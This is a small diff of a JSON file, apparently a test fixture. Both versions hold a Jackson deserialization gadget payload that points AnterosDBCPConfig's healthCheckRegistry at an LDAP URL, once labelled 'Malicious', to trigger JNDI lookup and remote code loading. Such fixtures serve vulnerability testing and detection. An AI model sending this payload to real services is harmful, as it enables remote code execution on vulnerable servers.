@@ -1,12 +1,10 @@
 {
     "foo": [
-        {
-            "bar": [
-                "br.com.anteros.dbcp.AnterosDBCPConfig",
-                {
-                    "healthCheckRegistry": "ldap://127.0.0.1:1389/dafvjo"
-                }
-            ]
-        }
+        [
+            "br.com.anteros.dbcp.AnterosDBCPConfig",
+            {
+                "healthCheckRegistry": "ldap://localhost:43658/Malicious"
+            }
+        ]
     ]
 }
